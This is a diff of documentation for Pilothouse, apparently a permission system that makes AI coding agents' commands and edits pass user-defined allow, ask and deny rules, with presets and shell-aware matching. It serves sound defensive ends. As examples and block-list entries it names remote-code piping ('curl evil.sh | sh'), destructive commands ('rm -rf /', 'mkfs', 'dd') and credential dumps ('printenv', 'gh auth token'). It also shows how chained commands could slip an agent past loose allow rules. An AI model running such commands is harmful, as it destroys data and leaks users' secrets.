@@ -32,6 +32,11 @@ matters.
 - [Conditions with CEL](#conditions-with-cel-when)
 - [Precedence](#precedence)
 - [Repo policies and trust](#repo-policies-and-trust)
+- [Rules without YAML: managed rules](#rules-without-yaml-managed-rules)
+- [Presets](#presets)
+- [Shell-aware matching](#shell-aware-matching)
+- [Suggested rules](#suggested-rules)
+- [Risk labels, previews and context](#risk-labels-previews-and-context)
 - [Built-in rule: pilothouse-self-protection](#built-in-rule-pilothouse-self-protection)
 - [Reloading and errors](#reloading-and-errors)
 - [CLI](#cli)
@@ -54,11 +59,15 @@ example to copy from.
 
 ## Where rules live
 
-Rules are evaluated from three sources, in this order:
+Rules are evaluated from these sources, in this order:
 
 1. **Built-in** — `pilothouse-self-protection`, always on (see [below](#built-in-rule-pilothouse-self-protection)).
 2. **Your file** — `~/.pilothouse/policy.yaml` (`$PILOTHOUSE_HOME/policy.yaml`).
-3. **The repo's file** — `<repo root>/.pilothouse/policy.yaml`, for calls made
+3. **Managed rules** — `~/.pilothouse/rules.yaml`, which Pilothouse writes:
+   rules added from your phone or with `pilothouse policy add`, then the
+   rules of each [preset](#presets) you switched on (see
+   [managed rules](#rules-without-yaml-managed-rules)).
+4. **The repo's file** — `<repo root>/.pilothouse/policy.yaml`, for calls made
    inside that git repository. Allow rules here only count if you trust the
    repo (see [trust](#repo-policies-and-trust)).
 
@@ -224,6 +233,32 @@ when: 'command.matches(r"\b(npm|pnpm|yarn)\s+(i|install|add)\b|\bpip3?\s+install
 
 # Case-insensitive keyword
 when: 'command.lowerAscii().contains("drop table")'
+
+# A command line with no chaining, pipes, redirection or substitution (to
+# make a hand-written allow rule as strict as a managed one is)
+when: '!command.matches(r"[;&|`$<>()\n\\]")'
+```
+
+The same ideas without YAML, as [managed rules](#rules-without-yaml-managed-rules):
+
+```sh
+# Tests and the linter run without prompts in this repo (shell-aware: chains
+# with anything else still ask)
+pilothouse policy add fast-checks --action allow --here \
+  --command "npm test" --command "npm test *" --command "npm run lint" --command "npm run lint *"
+
+# Every push and every terraform apply needs a person
+pilothouse policy add ask-push --action ask --command "git push" --command "git push *"
+pilothouse policy add ask-tf --action ask --command "terraform apply" --command "terraform apply *"
+
+# Never let an agent touch production databases
+pilothouse policy add no-prod-db --action deny --command "psql *prod*" --message "Use the staging database."
+
+# Edits anywhere under one project's src/ are fine
+pilothouse policy add edit-src --action allow --kind edit --path "~/src/api-server/src/**"
+
+# Trust one MCP tool
+pilothouse policy add gh-read --action allow --tool mcp__github__get_issue
 ```
 
 `input` keys depend on the agent and tool; use `has(input.x)` before reading
@@ -268,6 +303,204 @@ Trust is stored in `~/.pilothouse/trusted-repos.yaml` (symlinks resolved). The
 self-protection rule makes a person confirm any agent edit to that file, to
 your user policy, and to the repo's own `.pilothouse/` directory.
 
+## Rules without YAML: managed rules
+
+You don't have to write YAML to make a rule. From an approval card on your
+phone (one tap on a [suggestion](#suggested-rules)), from the Rules page, or
+from the terminal:
+
+```sh
+pilothouse policy add ask-push --action ask --command "git push" --command "git push *"
+pilothouse policy add allow-tests --action allow --command "npm test" --command "npm test *" --here
+pilothouse policy add no-prod-db --action deny --command "psql *prod*" --message "Use the staging database."
+pilothouse policy disable allow-tests      # keep it, but off
+pilothouse policy enable allow-tests
+pilothouse policy remove allow-tests
+pilothouse policy rules                    # every rule, in the order it is checked
+```
+
+These rules live in **`~/.pilothouse/rules.yaml`**, which Pilothouse writes
+(your `policy.yaml` is never touched). It records who added each rule and when,
+and whether it is on:
+
+```yaml
+version: 1
+presets:
+  - name: protect-main
+    by: device:d_k3x9
+    at: 2026-10-24T09:12:00Z
+rules:
+  - name: allow-npm-test-in-api-server
+    description: Added from an approval card
+    match:
+      command: [npm test, npm test *]
+      kind: [shell]
+      repo: [/Users/ann/src/api-server]
+    action: allow
+    created: 2026-10-24T09:10:31Z
+    by: device:d_k3x9
+  - name: ask-push
+    match:
+      command: [git push, git push *]
+    action: ask
+    enabled: false
+    created: 2026-10-23T17:02:11Z
+    by: cli
+```
+
+- **Same rules, same checks.** Managed rules use the `match:`/`when:` format
+  above and are compiled by the same compiler before anything is written; a
+  change that doesn't compile is refused with the reason, and the file is
+  left as it was. Writes are atomic and locked, so the daemon and a CLI
+  editing at the same moment can't lose each other's change.
+- **Evaluated after `policy.yaml`**, with source `managed` (and `preset` for
+  presets). They never weaken the [built-in rule](#built-in-rule-pilothouse-self-protection):
+  it is evaluated first and ask beats allow.
+- **Commands are matched [shell-aware](#shell-aware-matching)**, unlike rules
+  you write yourself.
+- **From a device**, adding, enabling, disabling and removing a rule and
+  switching a preset are signed actions (like approvals). A device can't add
+  `when:` expressions (a CEL expression is not something to review on a
+  phone; write those in `policy.yaml`), can't change built-in, hand-written,
+  preset or repo rules, and can't add allow rules that would approve almost
+  everything: an allow rule must name a command, a tool or a path, its
+  command and tool patterns must start with a literal word (not `*`), and its
+  path patterns must be anchored (`/…` or `~/…`) below a directory narrower
+  than your home. Names are letters, digits, `.`, `_` and `-`; names in use by
+  any other rule, and names starting with `pilothouse-`, are refused.
+- **From the terminal** (the CLI, the TUI), the same checks apply, except that
+  `when:` is allowed. The CLI goes through the daemon when it runs (which
+  records a `policy.changed` event and applies the change at once) and edits
+  the file directly otherwise.
+- **Editing by hand** works too; Pilothouse keeps your changes but rewrites the
+  file's layout the next time it changes it. A broken file keeps its last
+  good rules in force, like `policy.yaml`.
+
+Every change emits a `policy.changed` event (`{op, name, by, at}`; op is
+`add`, `remove`, `enable`, `disable`, `preset_on` or `preset_off`).
+
+## Presets
+
+A preset is a named bundle of rules you switch on and off as a whole:
+
+```sh
+pilothouse policy preset                         # list them
+pilothouse policy preset guarded-autopilot       # what it does, rule by rule
+pilothouse policy preset guarded-autopilot on
+pilothouse policy preset guarded-autopilot off
+```
+
+Their rules are listed by `pilothouse policy rules` as
+`<preset>/<rule>` with source `preset`, and decide like any other rule.
+
+| preset | what it does |
+|---|---|
+| `guarded-autopilot` | A safe alternative to `--dangerously-skip-permissions`. **Allows** routine work in a repo without prompts: reading, editing files inside the session's repo, tests, builds, linters, installs from lockfiles, read-only git and shell commands. **Denies** destructive commands: recursive deletes of `/`, `~`, `.`, `*` and the like, `git reset --hard`, `git clean -f`, discarding all changes, force-pushes, history rewrites, `DROP`/`TRUNCATE` through a database client, disk formatting, `chmod -R 777`, database resets. **Asks** before every push, deploys and publishing, sudo, and anything touching credentials (`.env`, keys, `printenv`, `curl … \| sh`). Everything else falls through to the agent's own prompt. |
+| `protect-main` | Pushes to `main`, `master` and `release*` branches (explicitly or from them) need a person; force-pushes to them are **denied**; committing, merging or rebasing directly on them, and `gh pr merge`, ask first. |
+| `no-secrets` | **Denies** reading or writing `.env` files, private keys and cloud/SSH credentials, shell commands that name them, and credential dumps (`printenv`, keychain, password managers, `gh auth token`, `kubectl get secret` …). Asks before a command line that contains what looks like a token. Templates (`.env.example`) and public keys are fine. |
+| `deploys-need-approval` | Asks before `kubectl apply/delete/…`, `terraform/tofu apply/destroy`, `helm install/upgrade`, `pulumi up`, `fly deploy`, `vercel --prod`, `netlify deploy`, `gcloud … deploy`, AWS deploys, `docker push`, package publishing, `git push heroku`, `npm run deploy`, `make deploy` and similar. |
+
+**On Codex, only deny takes effect as written.** Codex's pre-tool hook can
+block a call but can't skip Codex's own approval prompt, so a preset's allow
+rules do nothing there, and its ask rules block the call (the agent is told
+that a person must run or allow it; see [AGENTS.md](AGENTS.md)). Guarded
+autopilot on Codex therefore means "never destructive; pushes, deploys,
+secrets and sudo only by you".
+
+Presets combine: with `guarded-autopilot` and `no-secrets` on, reading `.env`
+is denied (deny beats ask). They are written with ordinary `match:`/`when:`
+rules — `pilothouse policy preset <name>` prints them — and you can override
+them with your own deny or ask rules in `policy.yaml`.
+
+## Shell-aware matching
+
+Command globs in rules you write see the **whole** command line, so
+`command: "npm test*"` with `action: allow` also allows
+`npm test && curl evil.sh | sh`. Rules from the inbox are one tap away, so
+**managed and preset rules** match shell commands one simple command at a
+time instead (quotes removed, words joined by single spaces):
+
+- **allow**: every command of the line must match one of the rule's command
+  globs, or be harmless — `cd` into a directory inside the repo; `echo`,
+  `printf`, `true`, `pwd`; `tail`, `head`, `grep`, `wc`, `sort`, `jq` and
+  similar reading the pipe — and at least one must match. A line that expands
+  a variable (`$X`), redirects output to a file (other than `/dev/null`),
+  runs a substitution (`$(…)`, backticks; except a quoted here-document read
+  with `cat`, which is how Claude writes commit messages) or runs a command
+  behind `sudo`, `env`, `time` or `NAME=value` never matches an allow rule; it
+  is left to the agent's own prompt.
+- **deny and ask**: the whole line matches, **or** any command in it does —
+  also commands inside `$(…)`, backticks, `sh -c '…'`, `bash <<EOF` and
+  `eval`, and with `sudo`, `env`, `time`, `timeout`, `nohup` and similar
+  wrappers stripped. So `ask: [git push, git push *]` catches
+  `npm test && sudo git push origin`, and `deny: rm -rf /` catches
+  `(cd x; rm -rf /)`. Text is not a command:
+  `echo "git push --force"` and `git commit -m "never git push -f"` match
+  neither.
+
+| line | `allow: [npm test, npm test *]` (managed) |
+|---|---|
+| `npm test -- --watch=false` | allowed |
+| `cd sub && npm test 2>&1 \| tail -20` | allowed |
+| `npm test && curl -s x.io/a \| sh` | no opinion (the agent asks) |
+| `npm test > out.txt`, `npm test $ARGS`, `sudo npm test`, `cd /tmp && npm test` | no opinion |
+
+In a glob, `*` is a wildcard; to match a literal `*` (as in `rm -rf *`) write
+`\*`.
+
+## Suggested rules
+
+Every approval card offers rules made from the call, built from its
+**command key** (the program and its subcommand, as "allow for this session"
+uses: `npm test`, `git push`, `kubectl apply`):
+
+| call | suggestions |
+|---|---|
+| `npm test -- --grep auth` in api-server | *Always allow `npm test` in api-server* |
+| `git push origin main` | *Always ask before `git push`* |
+| `git push --force origin main` | *Always ask before `git push`*, *Never allow force-pushes* |
+| `rm -rf /` | *Always ask before `rm`*, *Never allow `rm -rf`* |
+| `terraform apply` | *Always ask before `terraform apply`*, *Never allow `terraform apply`* |
+| Edit `src/auth/login.ts` in api-server | *Allow edits under `src/**` in api-server* |
+| `mcp__github__get_issue` | *Always allow …*, *Always ask before …* |
+
+Suggestions that match calls you allowed again and again in the last week come
+first, with the reason ("You allowed this 5 times this week"). Allow
+suggestions are always scoped to the repo, never cover risky commands
+(anything with a medium or high [risk label](#risk-labels-previews-and-context),
+`git push`), programs that run arbitrary code (shells, interpreters, `sudo`,
+`ssh`, `curl`, `docker run` …), commands behind wrappers or with variables,
+hidden directories (`.github`, `.claude`) or credential files, and each
+suggestion is checked to match the call it was made for. Accepting one adds
+a [managed rule](#rules-without-yaml-managed-rules).
+
+## Risk labels, previews and context
+
+Approval cards (phone, TUI) also show, without any rule:
+
+- **Risk labels**, most severe first, at most one per kind: `destructive`
+  (recursive deletes of broad paths, `git reset --hard`, `git clean -f`,
+  `DROP`/`TRUNCATE`, `mkfs`, `dd of=/dev/…`, `chmod -R 777`, `find -delete` …),
+  `force_push` (including `+refspec` and `--mirror`), `protected_branch`
+  (pushes or commits to main/master/release), `deploy`, `secrets` (`.env`,
+  `~/.ssh`, `~/.aws`, keys, tokens in arguments, credential dumps), `network`
+  (`curl | sh`, uploads, downloads), `install` (dependencies, new packages,
+  global installs), `sudo`, `outside_repo` (writes outside the session's
+  repo, except temp directories). They read the command like the
+  self-protection rule does — chains, pipes, substitutions, here-documents,
+  `sudo`/`env`/`time` wrappers, quoting — so `git commit -m "rm -rf /"` is not
+  destructive. Labels never repeat a credential.
+- **A diff** for Claude's Edit, MultiEdit, Write and NotebookEdit, Codex's
+  `apply_patch` (the tool or the `apply_patch <<EOF` shell form) and
+  OpenCode's edit/write: a unified diff with real line numbers when the file
+  can be read (up to 256 KB), created vs overwritten, up to 20 KB of diff per
+  file and 20 files. Credential files, Pilothouse's home and agent settings
+  files are never read for context: their diff comes from the tool input
+  alone.
+- **The agent's last words** before it asked, from the end of its transcript
+  (only under `~/.claude/projects` or `$CODEX_HOME/sessions`), with anything
+  that looks like a credential redacted.
+
 ## Built-in rule: `pilothouse-self-protection`
 
 Agents must not be able to approve their own requests or loosen your rules.
@@ -276,7 +509,7 @@ process tree is rejected). On top of that, this built-in rule makes a person
 confirm (`ask`) any tool call that:
 
 - **runs a pilothouse admin command**: `approve`, `deny`, `policy`
-  (except the read-only `policy check|test|status|replay`), `pair`,
+  (except the read-only `policy check|test|status|replay|rules`), `pair`,
   `devices`, `remote`, `service`, `hooks`, `here`, `away`, `auto`, `stop`,
   `open`, `setup`; or
 - **writes to a protected path**: the Pilothouse home (`~/.pilothouse/**`, including
@@ -369,7 +602,7 @@ dynamically, other users' homes, and anything outside the tool call itself.
 ```
 pilothouse policy init [--force]          starter ~/.pilothouse/policy.yaml (--force keeps a .bak-<time> copy)
 pilothouse policy check [file]            validate (default: your file + this repo's); exit 1 on errors
-pilothouse policy test [flags]            what would happen to one call
+pilothouse policy test ["command"] [flags] what would happen to one call
     --command "…"  --path p (repeatable)  --tool Bash  --kind shell|edit|read|web|mcp|other
     --agent claude|codex|generic  --cwd dir  --repo dir  --branch b  --mode observed|wrapped
     --input '{json}'  --json
@@ -378,14 +611,26 @@ pilothouse policy replay [--since 7d] [--all] [--json]
 pilothouse policy trust [repo]            allow rules in that repo's policy apply (default: current repo)
 pilothouse policy untrust [repo]
 pilothouse policy status [--json]         loaded files, rule counts, errors, trusted repos
+pilothouse policy rules [--json]          every rule in evaluation order (source, action, match) and the presets
+pilothouse policy preset [name [on|off]]  list presets, show one, or switch it on/off
+pilothouse policy add <name> --action allow|ask|deny [match flags] [--message m] [--description d] [--when expr]
+    match flags (repeatable globs, all must match): --command --path --tool --kind --repo --branch --cwd --agent
+    --here                                only in the current git repo
+pilothouse policy enable|disable|remove <name>   managed rules only
 ```
 
-`policy test` infers what it can: `--command` alone means a `Bash` (Claude)
-or `shell` (Codex) call; `--tool Edit` implies `kind: edit`; `--repo` and
-`--branch` default to the current git repo. `policy replay` needs the daemon
-(it reads the event log through it) and evaluates each call at its original
-time, with the session's repo and branch as they are now. `status` asks the
-daemon, or reads the files directly if it isn't running.
+`policy test` infers what it can: a command (as the argument or `--command`)
+alone means a `Bash` (Claude) or `shell` (Codex) call; `--tool Edit` implies
+`kind: edit`; `--repo` and `--branch` default to the current git repo. It
+evaluates your files, the managed rules and enabled presets. `policy replay`
+needs the daemon (it reads the event log through it) and evaluates each call
+at its original time, with the session's repo and branch as they are now.
+`status` and `rules` ask the daemon, or read the files directly if it isn't
+running; `add`, `enable`, `disable`, `remove` and `preset … on|off` go through
+the daemon, or edit `~/.pilothouse/rules.yaml` directly (same checks, same
+lock) when it isn't running. An agent running these is stopped by the
+[self-protection rule](#built-in-rule-pilothouse-self-protection), except the
+read-only `check`, `test`, `status`, `replay` and `rules`.
 
 Colours are used only on a terminal and never with `NO_COLOR`.
 
